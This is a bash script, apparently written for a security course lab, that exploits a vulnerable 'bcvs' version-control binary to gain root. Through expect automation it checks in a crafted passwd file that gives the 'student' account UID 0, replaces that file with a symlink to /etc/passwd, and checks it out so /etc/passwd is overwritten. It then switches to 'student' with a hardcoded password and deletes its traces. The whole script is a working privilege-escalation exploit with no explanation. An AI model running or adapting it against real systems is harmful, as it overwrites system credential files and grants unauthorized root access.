#!/bin/bash

cd /opt/bcvs
touch block.list

touch exp1.exp
cat <<EOF>> exp1.exp
#!/usr/bin/expect -f
set timeout -1
spawn ./bcvs ci block.list

expect "Please write a SHORT explanation:\r"
send -- "anything\r"
expect eof
EOF

chmod +x exp1.exp
./exp1.exp

touch passwd

PASSWORD="passwd"

echo root:x:0:0::/root:/bin/bash >> $PASSWORD
echo student:x:0:0::/root:/bin/bash >> $PASSWORD

touch exp2.exp
cat <<EOF>> exp2.exp
#!/usr/bin/expect -f
set timeout -1
spawn ./bcvs ci passwd
send -- "anything\r"
expect eof
EOF

chmod +x exp2.exp
./exp2.exp

rm passwd
ln -s /etc/passwd passwd

touch exp3.exp
cat <<EOF>> exp3.exp
#!/usr/bin/expect -f
set timeout -1
spawn ./bcvs co passwd

expect "Please write a SHORT explanation:\r"
send -- "anything\r"
expect eof
EOF

touch exp4.exp
cat <<EOF>> exp4.exp
#!/usr/bin/expect -f
set timeout -1
spawn su student
expect "Password:"
send -- "security\r"
interact
expect eof
EOF

chmod +x exp3.exp
chmod +x exp4.exp
./exp3.exp
./exp4.exp
rm exp1.exp
rm exp2.exp
rm exp3.exp
rm exp4.exp
rm passwd
rm block.list
